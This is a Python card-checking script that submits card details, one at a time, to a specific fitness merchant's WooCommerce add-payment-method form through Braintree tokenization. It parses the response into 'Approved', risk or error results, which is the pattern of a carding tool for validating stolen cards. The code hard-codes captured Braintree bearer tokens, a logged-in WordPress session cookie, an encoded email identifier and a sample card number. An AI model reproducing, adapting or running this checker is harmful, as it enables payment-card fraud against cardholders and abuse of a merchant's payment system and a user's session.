def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	








	


















	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjUwNjAzNzEsImp0aSI6ImI5OWQxYWM2LTc1MjQtNDQyMy1iMTAxLWE1NjBlOGU4N2I2YSIsInN1YiI6IjV2cGNzZ2J3cjNydzM5bXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjV2cGNzZ2J3cjNydzM5bXkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6InN0cmVuZ3RobWRnbWFpbGNvbSJ9fQ.ALTV2NkoVh5nmlzTUBPXQLPLXL830-x1Z3JbHUAs10aFV_h0LzI3uJTZjbqMKbY7L7atk-T4iPrPae2d6uS55w',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '378044a3-f7a7-4338-bf3e-998b0ea724c7',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': 'hhfhfbfv',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"378044a3-f7a7-4338-bf3e-998b0ea724c7"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5154781587528744","expirationMonth":"06","expirationYear":"2027","cvv":"314","billingAddress":{"postalCode":"10080","streetAddress":"hhfhfbfv"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	tok = response.json()['data']['tokenizeCreditCard']['token']









	cookies = {
    'mtk_src_trk': '{"type":"typein","url":"(none)","utm_campaign":"(none)","utm_source":"(direct)","utm_medium":"(none)","utm_content":"(none)","utm_id":"(none)","utm_term":"(none)","session_entry":"https://www.barbellmedicine.com/my-account/add-payment-method/","session_start_time":"2024-08-21 00:50:01","session_pages":"2","session_count":"1"}',
    'cppro-ft': 'true',
    '_ga': 'GA1.1.2099942445.1724201403',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-08-29%2023%3A23%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.barbellmedicine.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-08-29%2023%3A23%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.barbellmedicine.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'woocommerce_items_in_cart': '1',
    'woocommerce_cart_hash': 'f2700f30536c36ecdccc22f732c41622',
    'breeze_folder_name': '13da6f77ca7498268962c6f3c05e753ff21beea2',
    'wordpress_logged_in_4db9712e786886e61cb94442e1ea3aeb': 'bbxbcbb.hhxbfbb%7C1726183517%7CzU73k2vWxmOIJO0hSTqaPr7dgAwEAHmFBQXBefMMaNV%7C79305183a23a90882ea321b86391f828faa02446fa04f1e45196b5045686767d',
    'wp_woocommerce_session_4db9712e786886e61cb94442e1ea3aeb': '32962%7C%7C1725146656%7C%7C1725143056%7C%7Cf75ffa9f9430c0e0cd8a3061dad4bfd9',
    '__kla_id': 'eyJlbWFpbCI6Im1vaDU1Mjd2Ym5tQGdtYWlsLmNvbSJ9',
    'sbjs_session': 'pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.barbellmedicine.com%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_5CFFFZKQ3Y': 'GS1.1.1724973826.3.1.1724973998.60.0.420054583',
}

	headers = {
    'authority': 'www.barbellmedicine.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'mtk_src_trk={"type":"typein","url":"(none)","utm_campaign":"(none)","utm_source":"(direct)","utm_medium":"(none)","utm_content":"(none)","utm_id":"(none)","utm_term":"(none)","session_entry":"https://www.barbellmedicine.com/my-account/add-payment-method/","session_start_time":"2024-08-21 00:50:01","session_pages":"2","session_count":"1"}; cppro-ft=true; _ga=GA1.1.2099942445.1724201403; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-29%2023%3A23%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.barbellmedicine.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-29%2023%3A23%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.barbellmedicine.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; woocommerce_items_in_cart=1; woocommerce_cart_hash=f2700f30536c36ecdccc22f732c41622; breeze_folder_name=13da6f77ca7498268962c6f3c05e753ff21beea2; wordpress_logged_in_4db9712e786886e61cb94442e1ea3aeb=bbxbcbb.hhxbfbb%7C1726183517%7CzU73k2vWxmOIJO0hSTqaPr7dgAwEAHmFBQXBefMMaNV%7C79305183a23a90882ea321b86391f828faa02446fa04f1e45196b5045686767d; wp_woocommerce_session_4db9712e786886e61cb94442e1ea3aeb=32962%7C%7C1725146656%7C%7C1725143056%7C%7Cf75ffa9f9430c0e0cd8a3061dad4bfd9; __kla_id=eyJlbWFpbCI6Im1vaDU1Mjd2Ym5tQGdtYWlsLmNvbSJ9; sbjs_session=pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.barbellmedicine.com%2Fmy-account%2Fadd-payment-method%2F; _ga_5CFFFZKQ3Y=GS1.1.1724973826.3.1.1724973998.60.0.420054583',
    'origin': 'https://www.barbellmedicine.com',
    'pragma': 'no-cache',
    'referer': 'https://www.barbellmedicine.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"b87d296f4c87a95c947c712ed13f7a8d","fraud_merchant_id":null,"correlation_id":"378044a3-f7a7-4338-bf3e-998b0ea7"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/5vpcsgbwr3rw39my/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/5vpcsgbwr3rw39my"},"merchantId":"5vpcsgbwr3rw39my","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"braintreeApi":{"accessToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjUwNjAyNjUsImp0aSI6ImJlODhmOTc4LThjZGYtNGFiMy1hMWI1LTYyODU0MGZlMjZjZCIsInN1YiI6IjV2cGNzZ2J3cjNydzM5bXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjV2cGNzZ2J3cjNydzM5bXkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.1ggdwF5STXDvbKHqbCwzTQUTvY1uBhHqGBlZu1mkLgpBQN36qVPLlnDHkKa1EfuQ2mdtmADxTE65BPIyHxSkFw","url":"https://payments.braintree-api.com"},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","American Express","Discover","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Barbell Medicine","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjUwNjAyNjUsImp0aSI6ImZlNTZjMDkwLWUwMDAtNDcyMC1iNDVjLTMyMjdhOTJmZTAzMCIsInN1YiI6IjV2cGNzZ2J3cjNydzM5bXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjV2cGNzZ2J3cjNydzM5bXkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.yq3mnVww7GYg_n8VRSqSNx1Bq3I2tt23Y45Od0MQuQ5wzVOXBQZfjKPYfPjR9_jvxvyeLSKhOVax7_IHYPmOuA","paypalClientId":"AQLmwmACb3IQjDKpEznxbiLWzpZ0N5Z_xeFi8V_xLmhEJsP0_KLmkEQNg2bsGbqUZwfcQH1vcWlx0g9Q","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Barbell Medicine","clientId":"AQLmwmACb3IQjDKpEznxbiLWzpZ0N5Z_xeFi8V_xLmhEJsP0_KLmkEQNg2bsGbqUZwfcQH1vcWlx0g9Q","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"strengthmdgmailcom","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': '613ca90fb4',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post(
    'https://www.barbellmedicine.com/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)
	text = response.text
	pattern = r'Reason: (.*?)\s*</li>'
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result


	
